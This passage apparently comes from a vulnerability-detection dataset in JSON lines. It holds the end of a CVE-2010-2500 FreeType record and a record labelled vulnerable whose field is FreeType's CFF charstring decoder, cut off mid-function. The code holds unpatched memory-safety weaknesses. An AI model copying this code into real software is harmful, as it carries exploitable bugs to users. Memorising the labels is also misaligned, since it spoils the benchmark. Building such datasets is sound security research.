"CVE-2010-2500", "cve_desc": "Integer overflow in the gray_render_span function in smooth/ftgrays.c in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2500"}
{"idx": 269, "project": "savannah", "commit_id": "7d3d2cc4fef72c6be9c454b3809c387e12b44cfc", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d3d2cc4fef72c6be9c454b3809c387e12b44cfc", "commit_message": "None", "target": 1, "func": "  cff_decoder_parse_charstrings( CFF_Decoder*  decoder,\n                                 FT_Byte*      charstring_base,\n                                 FT_ULong      charstring_len )\n  {\n    FT_Error           error;\n    CFF_Decoder_Zone*  zone;\n    FT_Byte*           ip;\n    FT_Byte*           limit;\n    CFF_Builder*       builder = &decoder->builder;\n    FT_Pos             x, y;\n    FT_Fixed           seed;\n    FT_Fixed*          stack;\n    FT_Int             charstring_type =\n                         decoder->cff->top_font.font_dict.charstring_type;\n\n    T2_Hints_Funcs     hinter;\n\n\n    /* set default width */\n    decoder->num_hints  = 0;\n    decoder->read_width = 1;\n\n    /* compute random seed from stack address of parameter */\n    seed = (FT_Fixed)( ( (FT_PtrDist)(char*)&seed              ^\n                         (FT_PtrDist)(char*)&decoder           ^\n                         (FT_PtrDist)(char*)&charstring_base ) &\n                         FT_ULONG_MAX ) ;\n    seed = ( seed ^ ( seed >> 10 ) ^ ( seed >> 20 ) ) & 0xFFFFL;\n    if ( seed == 0 )\n      seed = 0x7384;\n\n    /* initialize the decoder */\n    decoder->top  = decoder->stack;\n    decoder->zone = decoder->zones;\n    zone          = decoder->zones;\n    stack         = decoder->top;\n\n    hinter = (T2_Hints_Funcs)builder->hints_funcs;\n\n    builder->path_begun = 0;\n\n    zone->base           = charstring_base;\n    limit = zone->limit  = charstring_base + charstring_len;\n    ip    = zone->cursor = zone->base;\n\n    error = CFF_Err_Ok;\n\n    x = builder->pos_x;\n    y = builder->pos_y;\n\n    /* begin hints recording session, if any */\n    if ( hinter )\n      hinter->open( hinter->hints );\n\n    /* now execute loop */\n    while ( ip < limit )\n    {\n      CFF_Operator  op;\n      FT_Byte       v;\n\n\n      /********************************************************************/\n      /*                                                                  */\n      /* Decode operator or operand                                       */\n      /*                                                                  */\n      v = *ip++;\n      if ( v >= 32 || v == 28 )\n      {\n        FT_Int    shift = 16;\n        FT_Int32  val;\n\n\n        /* this is an operand, push it on the stack */\n        if ( v == 28 )\n        {\n          if ( ip + 1 >= limit )\n            goto Syntax_Error;\n          val = (FT_Short)( ( (FT_Short)ip[0] << 8 ) | ip[1] );\n          ip += 2;\n        }\n        else if ( v < 247 )\n          val = (FT_Int32)v - 139;\n        else if ( v < 251 )\n        {\n          if ( ip >= limit )\n            goto Syntax_Error;\n          val = ( (FT_Int32)v - 247 ) * 256 + *ip++ + 108;\n        }\n        else if ( v < 255 )\n        {\n          if ( ip >= limit )\n            goto Syntax_Error;\n          val = -( (FT_Int32)v - 251 ) * 256 - *ip++ - 108;\n        }\n        else\n        {\n          if ( ip + 3 >= limit )\n            goto Syntax_Error;\n          val = ( (FT_Int32)ip[0] << 24 ) |\n                ( (FT_Int32)ip[1] << 16 ) |\n                ( (FT_Int32)ip[2] <<  8 ) |\n                            ip[3];\n          ip    += 4;\n          if ( charstring_type == 2 )\n            shift = 0;\n        }\n        if ( decoder->top - stack >= CFF_MAX_OPERANDS )\n          goto Stack_Overflow;\n\n        val           <<= shift;\n        *decoder->top++ = val;\n\n#ifdef FT_DEBUG_LEVEL_TRACE\n        if ( !( val & 0xFFFFL ) )\n          FT_TRACE4(( \" %ld\", (FT_Int32)( val >> 16 ) ));\n        else\n          FT_TRACE4(( \" %.2f\", val / 65536.0 ));\n#endif\n\n      }\n      else\n      {\n        /* The specification says that normally arguments are to be taken */\n        /* from the bottom of the stack.  However, this seems not to be   */\n        /* correct, at least for Acroread 7.0.8 on GNU/Linux: It pops the */\n        /* arguments similar to a PS interpreter.                         */\n\n        FT_Fixed*  args     = decoder->top;\n        FT_Int     num_args = (FT_Int)( args - decoder->stack );\n        FT_Int     req_args;\n\n\n        /* find operator */\n        op = cff_op_unknown;\n\n        switch ( v )\n        {\n        case 1:\n          op = cff_op_hstem;\n          break;\n        case 3:\n          op = cff_op_vstem;\n          break;\n        case 4:\n          op = cff_op_vmoveto;\n          break;\n        case 5:\n          op = cff_op_rlineto;\n          break;\n        case 6:\n          op = cff_op_hlineto;\n          break;\n        case 7:\n          op = cff_op_vlineto;\n          break;\n        case 8:\n          op = cff_op_rrcurveto;\n          break;\n        case 9:\n          op = cff_op_closepath;\n          break;\n        case 10:\n          op = cff_op_callsubr;\n          break;\n        case 11:\n          op = cff_op_return;\n          break;\n        case 12:\n          {\n            if ( ip >= limit )\n              goto Syntax_Error;\n            v = *ip++;\n\n            switch ( v )\n            {\n            case 0:\n              op = cff_op_dotsection;\n              break;\n            case 1: /* this is actually the Type1 vstem3 operator */\n              op = cff_op_vstem;\n              break;\n            case 2: /* this is actually the Type1 hstem3 operator */\n              op = cff_op_hstem;\n              break;\n            case 3:\n              op = cff_op_and;\n              break;\n            case 4:\n              op = cff_op_or;\n              break;\n            case 5:\n              op = cff_op_not;\n              break;\n            case 6:\n              op = cff_op_seac;\n              break;\n            case 7:\n              op = cff_op_sbw;\n              break;\n            case 8:\n              op = cff_op_store;\n              break;\n            case 9:\n              op = cff_op_abs;\n              break;\n            case 10:\n              op = cff_op_add;\n              break;\n            case 11:\n              op = cff_op_sub;\n              break;\n            case 12:\n              op = cff_op_div;\n              break;\n            case 13:\n              op = cff_op_load;\n              break;\n            case 14:\n              op = cff_op_neg;\n              break;\n            case 15:\n              op = cff_op_eq;\n              break;\n            case 16:\n              op = cff_op_callothersubr;\n              break;\n            case 17:\n              op = cff_op_pop;\n              break;\n            case 18:\n              op = cff_op_drop;\n              break;\n            case 20:\n              op = cff_op_put;\n              break;\n            case 21:\n              op = cff_op_get;\n              break;\n            case 22:\n              op = cff_op_ifelse;\n              break;\n            case 23:\n              op = cff_op_random;\n              break;\n            case 24:\n              op = cff_op_mul;\n              break;\n            case 26:\n              op = cff_op_sqrt;\n              break;\n            case 27:\n              op = cff_op_dup;\n              break;\n            case 28:\n              op = cff_op_exch;\n              break;\n            case 29:\n              op = cff_op_index;\n              break;\n            case 30:\n              op = cff_op_roll;\n              break;\n            case 33:\n              op = cff_op_setcurrentpoint;\n              break;\n            case 34:\n              op = cff_op_hflex;\n              break;\n            case 35:\n              op = cff_op_flex;\n              break;\n            case 36:\n              op = cff_op_hflex1;\n              break;\n            case 37:\n              op = cff_op_flex1;\n              break;\n            default:\n              /* decrement ip for syntax error message */\n              ip--;\n            }\n          }\n          break;\n        case 13:\n          op = cff_op_hsbw;\n          break;\n        case 14:\n          op = cff_op_endchar;\n          break;\n        case 16:\n          op = cff_op_blend;\n          break;\n        case 18:\n          op = cff_op_hstemhm;\n          break;\n        case 19:\n          op = cff_op_hintmask;\n          break;\n        case 20:\n          op = cff_op_cntrmask;\n          break;\n        case 21:\n          op = cff_op_rmoveto;\n          break;\n        case 22:\n          op = cff_op_hmoveto;\n          break;\n        case 23:\n          op = cff_op_vstemhm;\n          break;\n        case 24:\n          op = cff_op_rcurveline;\n          break;\n        case 25:\n          op = cff_op_rlinecurve;\n          break;\n        case 26:\n          op = cff_op_vvcurveto;\n          break;\n        case 27:\n          op = cff_op_hhcurveto;\n          break;\n        case 29:\n          op = cff_op_callgsubr;\n          break;\n        case 30:\n          op = cff_op_vhcurveto;\n          break;\n        case 31:\n          op = cff_op_hvcurveto;\n          break;\n        default:\n          break;\n        }\n\n        if ( op == cff_op_unknown )\n          goto Syntax_Error;\n\n        /* check arguments */\n        req_args = cff_argument_counts[op];\n        if ( req_args & CFF_COUNT_CHECK_WIDTH )\n        {\n          if ( num_args > 0 && decoder->read_width )\n          {\n            /* If `nominal_width' is non-zero, the number is really a      */\n            /* difference against `nominal_width'.  Else, the number here  */\n            /* is truly a width, not a difference against `nominal_width'. */\n            /* If the font does not set `nominal_width', then              */\n            /* `nominal_width' defaults to zero, and so we can set         */\n            /* `glyph_width' to `nominal_width' plus number on the stack   */\n            /* -- for either case.                                         */\n\n            FT_Int  set_width_ok;\n\n\n            switch ( op )\n            {\n            case cff_op_hmoveto:\n            case cff_op_vmoveto:\n              set_width_ok = num_args & 2;\n              break;\n\n            case cff_op_hstem:\n            case cff_op_vstem:\n            case cff_op_hstemhm:\n            case cff_op_vstemhm:\n            case cff_op_rmoveto:\n            case cff_op_hintmask:\n            case cff_op_cntrmask:\n              set_width_ok = num_args & 1;\n              break;\n\n            case cff_op_endchar:\n              /* If there is a width specified for endchar, we either have */\n              /* 1 argument or 5 arguments.  We like to argue.             */\n              set_width_ok = ( num_args == 5 ) || ( num_args == 1 );\n              break;\n\n            default:\n              set_width_ok = 0;\n              break;\n            }\n\n            if ( set_width_ok )\n            {\n              decoder->glyph_width = decoder->nominal_width +\n                                       ( stack[0] >> 16 );\n\n              if ( decoder->width_only )\n              {\n                /* we only want the advance width; stop here */\n                break;\n              }\n\n              /* Consumed an argument. */\n              num_args--;\n            }\n          }\n\n          decoder->read_width = 0;\n          req_args            = 0;\n        }\n\n        req_args &= 0x000F;\n        if ( num_args < req_args )\n          goto Stack_Underflow;\n        args     -= req_args;\n        num_args -= req_args;\n\n        /* At this point, `args' points to the first argument of the  */\n        /* operand in case `req_args' isn't zero.  Otherwise, we have */\n        /* to adjust `args' manually.                                 */\n\n        /* Note that we only pop arguments from the stack which we    */\n        /* really need and can digest so that we can continue in case */\n        /* of superfluous stack elements.                             */\n\n        switch ( op )\n        {\n        case cff_op_hstem:\n        case cff_op_vstem:\n        case cff_op_hstemhm:\n        case cff_op_vstemhm:\n          /* the number of arguments is always even here */\n          FT_TRACE4((\n              op == cff_op_hstem   ? \" hstem\\n\"   :\n            ( op == cff_op_vstem   ? \" vstem\\n\"   :\n            ( op == cff_op_hstemhm ? \" hstemhm\\n\" : \" vstemhm\\n\" ) ) ));\n\n          if ( hinter )\n            hinter->stems( hinter->hints,\n                           ( op == cff_op_hstem || op == cff_op_hstemhm ),\n                           num_args / 2,\n                           args - ( num_args & ~1 ) );\n\n          decoder->num_hints += num_args / 2;\n          args = stack;\n          break;\n\n        case cff_op_hintmask:\n        case cff_op_cntrmask:\n          FT_TRACE4(( op == cff_op_hintmask ? \" hintmask\" : \" cntrmask\" ));\n\n          /* implement vstem when needed --                        */\n          /* the specification doesn't say it, but this also works */\n          /* with the 'cntrmask' operator                          */\n          /*                                                       */\n          if ( num_args > 0 )\n          {\n            if ( hinter )\n              hinter->stems( hinter->hints,\n                             0,\n                             num_args / 2,\n                             args - ( num_args & ~1 ) );\n\n            decoder->num_hints += num_args / 2;\n          }\n\n          if ( hinter )\n          {\n            if ( op == cff_op_hintmask )\n              hinter->hintmask( hinter->hints,\n                                builder->current->n_points,\n                                decoder->num_hints,\n                                ip );\n            else\n              hinter->counter( hinter->hints,\n                               decoder->num_hints,\n                               ip );\n          }\n\n#ifdef FT_DEBUG_LEVEL_TRACE\n          {\n            FT_UInt maskbyte;\n\n\n            FT_TRACE4(( \" (maskbytes: \" ));\n\n            for ( maskbyte = 0;\n                  maskbyte < (FT_UInt)(( decoder->num_hints + 7 ) >> 3);\n                  maskbyte++, ip++ )\n              FT_TRACE4(( \"0x%02X\", *ip ));\n\n            FT_TRACE4(( \")\\n\" ));\n          }\n#else\n          ip += ( decoder->num_hints + 7 ) >> 3;\n#endif\n          if ( ip >= limit )\n            goto Syntax_Error;\n          args = stack;\n          break;\n\n        case cff_op_rmoveto:\n          FT_TRACE4(( \" rmoveto\\n\" ));\n\n          cff_builder_close_contour( builder );\n          builder->path_begun = 0;\n          x   += args[-2];\n          y   += args[-1];\n          args = stack;\n          break;\n\n        case cff_op_vmoveto:\n          FT_TRACE4(( \" vmoveto\\n\" ));\n\n          cff_builder_close_contour( builder );\n          builder->path_begun = 0;\n          y   += args[-1];\n          args = stack;\n          break;\n\n        case cff_op_hmoveto:\n          FT_TRACE4(( \" hmoveto\\n\" ));\n\n          cff_builder_close_contour( builder );\n          builder->path_begun = 0;\n          x   += args[-1];\n          args = stack;\n          break;\n\n        case cff_op_rlineto:\n          FT_TRACE4(( \" rlineto\\n\" ));\n\n          if ( cff_builder_start_point ( builder, x, y ) ||\n               check_points( builder, num_args / 2 )     )\n            goto Fail;\n\n          if ( num_args < 2 )\n            goto Stack_Underflow;\n\n          args -= num_args & ~1;\n          while ( args < decoder->top )\n          {\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 1 );\n            args += 2;\n          }\n          args = stack;\n          break;\n\n        case cff_op_hlineto:\n        case cff_op_vlineto:\n          {\n            FT_Int  phase = ( op == cff_op_hlineto );\n\n\n            FT_TRACE4(( op == cff_op_hlineto ? \" hlineto\\n\"\n                                             : \" vlineto\\n\" ));\n\n            if ( num_args < 1 )\n              goto Stack_Underflow;\n\n            if ( cff_builder_start_point ( builder, x, y ) ||\n                 check_points( builder, num_args )         )\n              goto Fail;\n\n            args = stack;\n            while ( args < decoder->top )\n            {\n              if ( phase )\n                x += args[0];\n              else\n                y += args[0];\n\n              if ( cff_builder_add_point1( builder, x, y ) )\n                goto Fail;\n\n              args++;\n              phase ^= 1;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_rrcurveto:\n          {\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" rrcurveto\\n\" ));\n\n            if ( num_args < 6 )\n              goto Stack_Underflow;\n\n            nargs = num_args - num_args % 6;\n\n            if ( cff_builder_start_point ( builder, x, y ) ||\n                 check_points( builder, nargs / 2 )     )\n              goto Fail;\n\n            args -= nargs;\n            while ( args < decoder->top )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[2];\n              y += args[3];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[4];\n              y += args[5];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 6;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_vvcurveto:\n          {\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" vvcurveto\\n\" ));\n\n            if ( num_args < 4 )\n              goto Stack_Underflow;\n\n            /* if num_args isn't of the form 4n or 4n+1, */\n            /* we reduce it to 4n+1                      */\n\n            nargs = num_args - num_args % 4;\n            if ( num_args - nargs > 0 )\n              nargs += 1;\n\n            if ( cff_builder_start_point( builder, x, y ) )\n              goto Fail;\n\n            args -= nargs;\n\n            if ( nargs & 1 )\n            {\n              x += args[0];\n              args++;\n              nargs--;\n            }\n\n            if ( check_points( builder, 3 * ( nargs / 4 ) ) )\n              goto Fail;\n\n            while ( args < decoder->top )\n            {\n              y += args[0];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[1];\n              y += args[2];\n              cff_builder_add_point( builder, x, y, 0 );\n              y += args[3];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 4;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_hhcurveto:\n          {\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" hhcurveto\\n\" ));\n\n            if ( num_args < 4 )\n              goto Stack_Underflow;\n\n            /* if num_args isn't of the form 4n or 4n+1, */\n            /* we reduce it to 4n+1                      */\n\n            nargs = num_args - num_args % 4;\n            if ( num_args - nargs > 0 )\n              nargs += 1;\n\n            if ( cff_builder_start_point( builder, x, y ) )\n              goto Fail;\n\n            args -= nargs;\n            if ( nargs & 1 )\n            {\n              y += args[0];\n              args++;\n              nargs--;\n            }\n\n            if ( check_points( builder, 3 * ( nargs / 4 ) ) )\n              goto Fail;\n\n            while ( args < decoder->top )\n            {\n              x += args[0];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[1];\n              y += args[2];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[3];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 4;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_vhcurveto:\n        case cff_op_hvcurveto:\n          {\n            FT_Int  phase;\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( op == cff_op_vhcurveto ? \" vhcurveto\\n\"\n                                               : \" hvcurveto\\n\" ));\n\n            if ( cff_builder_start_point( builder, x, y ) )\n              goto Fail;\n\n            if ( num_args < 4 )\n              goto Stack_Underflow;\n\n            /* if num_args isn't of the form 8n, 8n+1, 8n+4, or 8n+5, */\n            /* we reduce it to the largest one which fits             */\n\n            nargs = num_args - num_args % 4;\n            if ( num_args - nargs > 0 )\n              nargs += 1;\n\n            args -= nargs;\n            if ( check_points( builder, ( nargs / 4 ) * 3 ) )\n              goto Stack_Underflow;\n\n            phase = ( op == cff_op_hvcurveto );\n\n            while ( nargs >= 4 )\n            {\n              nargs -= 4;\n              if ( phase )\n              {\n                x += args[0];\n                cff_builder_add_point( builder, x, y, 0 );\n                x += args[1];\n                y += args[2];\n                cff_builder_add_point( builder, x, y, 0 );\n                y += args[3];\n                if ( nargs == 1 )\n                  x += args[4];\n                cff_builder_add_point( builder, x, y, 1 );\n              }\n              else\n              {\n                y += args[0];\n                cff_builder_add_point( builder, x, y, 0 );\n                x += args[1];\n                y += args[2];\n                cff_builder_add_point( builder, x, y, 0 );\n                x += args[3];\n                if ( nargs == 1 )\n                  y += args[4];\n                cff_builder_add_point( builder, x, y, 1 );\n              }\n              args  += 4;\n              phase ^= 1;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_rlinecurve:\n          {\n            FT_Int  num_lines;\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" rlinecurve\\n\" ));\n\n            if ( num_args < 8 )\n              goto Stack_Underflow;\n\n            nargs     = num_args & ~1;\n            num_lines = ( nargs - 6 ) / 2;\n\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, num_lines + 3 )   )\n              goto Fail;\n\n            args -= nargs;\n\n            /* first, add the line segments */\n            while ( num_lines > 0 )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 2;\n              num_lines--;\n            }\n\n            /* then the curve */\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 0 );\n            x += args[2];\n            y += args[3];\n            cff_builder_add_point( builder, x, y, 0 );\n            x += args[4];\n            y += args[5];\n            cff_builder_add_point( builder, x, y, 1 );\n            args = stack;\n          }\n          break;\n\n        case cff_op_rcurveline:\n          {\n            FT_Int  num_curves;\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" rcurveline\\n\" ));\n\n            if ( num_args < 8 )\n              goto Stack_Underflow;\n\n            nargs      = num_args - 2;\n            nargs      = nargs - nargs % 6 + 2;\n            num_curves = ( nargs - 2 ) / 6;\n\n            if ( cff_builder_start_point ( builder, x, y ) ||\n                 check_points( builder, num_curves * 3 + 2 ) )\n              goto Fail;\n\n            args -= nargs;\n\n            /* first, add the curves */\n            while ( num_curves > 0 )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[2];\n              y += args[3];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[4];\n              y += args[5];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 6;\n              num_curves--;\n            }\n\n            /* then the final line */\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 1 );\n            args = stack;\n          }\n          break;\n\n        case cff_op_hflex1:\n          {\n            FT_Pos start_y;\n\n\n            FT_TRACE4(( \" hflex1\\n\" ));\n\n            /* adding five more points: 4 control points, 1 on-curve point */\n            /* -- make sure we have enough space for the start point if it */\n            /* needs to be added                                           */\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            /* record the starting point's y position for later use */\n            start_y = y;\n\n            /* first control point */\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* second control point */\n            x += args[2];\n            y += args[3];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* join point; on curve, with y-value the same as the last */\n            /* control point's y-value                                 */\n            x += args[4];\n            cff_builder_add_point( builder, x, y, 1 );\n\n            /* third control point, with y-value the same as the join */\n            /* point's y-value                                        */\n            x += args[5];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* fourth control point */\n            x += args[6];\n            y += args[7];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* ending point, with y-value the same as the start   */\n            x += args[8];\n            y  = start_y;\n            cff_builder_add_point( builder, x, y, 1 );\n\n            args = stack;\n            break;\n          }\n\n        case cff_op_hflex:\n          {\n            FT_Pos start_y;\n\n\n            FT_TRACE4(( \" hflex\\n\" ));\n\n            /* adding six more points; 4 control points, 2 on-curve points */\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            /* record the starting point's y-position for later use */\n            start_y = y;\n\n            /* first control point */\n            x += args[0];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* second control point */\n            x += args[1];\n            y += args[2];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* join point; on curve, with y-value the same as the last */\n            /* control point's y-value                                 */\n            x += args[3];\n            cff_builder_add_point( builder, x, y, 1 );\n\n            /* third control point, with y-value the same as the join */\n            /* point's y-value                                        */\n            x += args[4];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* fourth control point */\n            x += args[5];\n            y  = start_y;\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* ending point, with y-value the same as the start point's */\n            /* y-value -- we don't add this point, though               */\n            x += args[6];\n            cff_builder_add_point( builder, x, y, 1 );\n\n            args = stack;\n            break;\n          }\n\n        case cff_op_flex1:\n          {\n            FT_Pos     start_x, start_y; /* record start x, y values for */\n                                         /* alter use                    */\n            FT_Fixed   dx = 0, dy = 0;   /* used in horizontal/vertical  */\n                                         /* algorithm below              */\n            FT_Int     horizontal, count;\n            FT_Fixed*  temp;\n\n\n            FT_TRACE4(( \" flex1\\n\" ));\n\n            /* adding six more points; 4 control points, 2 on-curve points */\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            /* record the starting point's x, y position for later use */\n            start_x = x;\n            start_y = y;\n\n            /* XXX: figure out whether this is supposed to be a horizontal */\n            /*      or vertical flex; the Type 2 specification is vague... */\n\n            temp = args;\n\n            /* grab up to the last argument */\n            for ( count = 5; count > 0; count-- )\n            {\n              dx += temp[0];\n              dy += temp[1];\n              temp += 2;\n            }\n\n            if ( dx < 0 )\n              dx = -dx;\n            if ( dy < 0 )\n              dy = -dy;\n\n            /* strange test, but here it is... */\n            horizontal = ( dx > dy );\n\n            for ( count = 5; count > 0; count-- )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y,\n                                     (FT_Bool)( count == 3 ) );\n              args += 2;\n            }\n\n            /* is last operand an x- or y-delta? */\n            if ( horizontal )\n            {\n              x += args[0];\n              y  = start_y;\n            }\n            else\n            {\n              x  = start_x;\n              y += args[0];\n            }\n\n            cff_builder_add_point( builder, x, y, 1 );\n\n            args = stack;\n            break;\n           }\n\n        case cff_op_flex:\n          {\n            FT_UInt  count;\n\n\n            FT_TRACE4(( \" flex\\n\" ));\n\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            for ( count = 6; count > 0; count-- )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y,\n                                     (FT_Bool)( count == 4 || count == 1 ) );\n              args += 2;\n            }\n\n            args = stack;\n          }\n          break;\n\n        case cff_op_seac:\n            FT_TRACE4(( \" seac\\n\" ));\n\n            error = cff_operator_seac( decoder,\n                                       args[0], args[1], args[2],\n                                       (FT_Int)( args[3] >> 16 ),\n                                       (FT_Int)( args[4] >> 16 ) );\n\n            /* add current outline to the glyph slot */\n            FT_GlyphLoader_Add( builder->loader );\n\n            /* return now! */\n            FT_TRACE4(( \"\\n\" ));\n            return error;\n\n        case cff_op_endchar:\n          FT_TRACE4(( \" endchar\\n\" ));\n\n          /* We are going to emulate the seac operator. */\n          if ( num_args >= 4 )\n          {\n            /* Save glyph width so that the subglyphs don't overwrite it. */\n            FT_Pos  glyph_width = decoder->glyph_width;\n\n            error = cff_operator_seac( decoder,\n                                       0L, args[-4], args[-3],\n                                       (FT_Int)( args[-2] >> 16 ),\n                                       (FT_Int)( args[-1] >> 16 ) );\n\n            decoder->glyph_width = glyph_width;\n          }\n          else\n          {\n            if ( !error )\n              error = CFF_Err_Ok;\n\n            cff_builder_close_contour( builder );\n\n            /* close hints recording session */\n            if ( hinter )\n            {\n              if ( hinter->close( hinter->hints,\n                                  builder->current->n_points ) )\n                goto Syntax_Error;\n\n              /* apply hints to the loaded glyph outline now */\n              hinter->apply( hinter->hints,\n                             builder->current,\n                             (PSH_Globals)builder->hints_globals,\n                             decoder->hint_mode );\n            }\n\n            /* add current outline to the glyph slot */\n            FT_GlyphLoader_Add( builder->loader );\n          }\n\n          /* return now! */\n          FT_TRACE4(( \"\\n\" ));\n          return error;\n\n        case cff_op_abs:\n          FT_TRACE4(( \" abs\\n\" ));\n\n          if ( args[0] < 0 )\n            args[0] = -args[0];\n          args++;\n          break;\n\n        case cff_op_add:\n          FT_TRACE4(( \" add\\n\" ));\n\n          args[0] += args[1];\n          args++;\n          break;\n\n        case cff_op_sub:\n          FT_TRACE4(( \" sub\\n\" ));\n\n          args[0] -= args[1];\n          args++;\n          break;\n\n        case cff_op_div:\n          FT_TRACE4(( \" div\\n\" ));\n\n          args[0] = FT_DivFix( args[0], args[1] );\n          args++;\n          break;\n\n        case cff_op_neg:\n          FT_TRACE4(( \" neg\\n\" ));\n\n          args[0] = -args[0];\n          args++;\n          break;\n\n        case cff_op_random:\n          {\n            FT_Fixed  Rand;\n\n\n            FT_TRACE4(( \" rand\\n\" ));\n\n            Rand = seed;\n            if ( Rand >= 0x8000L )\n              Rand++;\n\n            args[0] = Rand;\n            seed    = FT_MulFix( seed, 0x10000L - seed );\n            if ( seed == 0 )\n              seed += 0x2873;\n            args++;\n          }\n          break;\n\n        case cff_op_mul:\n          FT_TRACE4(( \" mul\\n\" ));\n\n          args[0] = FT_MulFix( args[0], args[1] );\n          args++;\n          break;\n\n        case cff_op_sqrt:\n          FT_TRACE4(( \" sqrt\\n\" ));\n\n          if ( args[0] > 0 )\n          {\n            FT_Int    count = 9;\n            FT_Fixed  root  = args[0];\n            FT_Fixed  new_root;\n\n\n            for (;;)\n            {\n              new_root = ( root + FT_DivFix( args[0], root ) + 1 ) >> 1;\n              if ( new_root == root || count <= 0 )\n                break;\n              root = new_root;\n            }\n            args[0] = new_root;\n          }\n          else\n            args[0] = 0;\n          args++;\n          break;\n\n        case cff_op_drop:\n          /* nothing */\n          FT_TRACE4(( \" drop\\n\" ));\n\n          break;\n\n        case cff_op_exch:\n          {\n            FT_Fixed  tmp;\n\n\n            FT_TRACE4(( \" exch\\n\" ));\n\n            tmp     = args[0];\n            args[0] = args[1];\n            args[1] = tmp;\n            args   += 2;\n          }\n          break;\n\n        case cff_op_index:\n          {\n            FT_Int  idx = (FT_Int)( args[0] >> 16 );\n\n\n            FT_TRACE4(( \" index\\n\" ));\n\n            if ( idx < 0 )\n              idx = 0;\n            else if ( idx > num_args - 2 )\n              idx = num_args - 2;\n            args[0] = args[-( idx + 1 )];\n            args++;\n          }\n          break;\n\n        case cff_op_roll:\n          {\n            FT_Int  count = (FT_Int)( args[0] >> 16 );\n            FT_Int  idx   = (FT_Int)( args[1] >> 16 );\n\n\n            FT_TRACE4(( \" roll\\n\" ));\n\n            if ( count <= 0 )\n              count = 1;\n\n            args -= count;\n            if ( args < stack )\n              goto Stack_Underflow;\n\n            if ( idx >= 0 )\n            {\n              while ( idx > 0 )\n              {\n                FT_Fixed  tmp = args[count - 1];\n                FT_Int    i;\n\n\n                for ( i = count - 2; i >= 0; i-- )\n                  args[i + 1] = args[i];\n                args[0] = tmp;\n                idx--;\n              }\n            }\n            else\n            {\n              while ( idx < 0 )\n              {\n                FT_Fixed  tmp = args[0];\n                FT_Int    i;\n\n\n                for ( i = 0; i < count - 1; i++ )\n                  args[i] = args[i + 1];\n                args[count - 1] = tmp;\n                idx++;\n              }\n            }\n            args += count;\n          }\n          break;\n\n        case cff_op_dup:\n          FT_TRACE4(( \" dup\\n\" ));\n\n          args[1] = args[0];\n          args += 2;\n          break;\n\n        case cff_op_put:\n          {\n            FT_Fixed  val = args[0];\n            FT_Int    idx = (FT_Int)( args[1] >> 16 );\n\n\n            FT_TRACE4(( \" put\\n\" ));\n\n            if ( idx >= 0 && idx < CFF_MAX_TRANS_ELEMENTS )\n              decoder->buildchar[idx] = val;\n          }\n          break;\n\n        case cff_op_get:\n          {\n            FT_Int    idx = (FT_Int)( args[0] >> 16 );\n            FT_Fixed  val = 0;\n\n\n            FT_TRACE4(( \" get\\n\" ));\n\n            if ( idx >= 0 && idx < CFF_MAX_TRANS_ELEMENTS )\n              val = decoder->buildchar[idx];\n\n            args[0] = val;\n            args++;\n          }\n          break;\n\n        case cff_op_store:\n          FT_TRACE4(( \" store\\n\"));\n\n          goto Unimplemented;\n\n        case cff_op_load:\n          FT_TRACE4(( \" load\\n\" ));\n\n          goto Unimplemented;\n\n        case cff_op_dotsection:\n          /* this operator is deprecated and ignored by the parser */\n          FT_TRACE4(( \" dotsection\\n\" ));\n          break;\n\n        case cff_op_closepath:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept 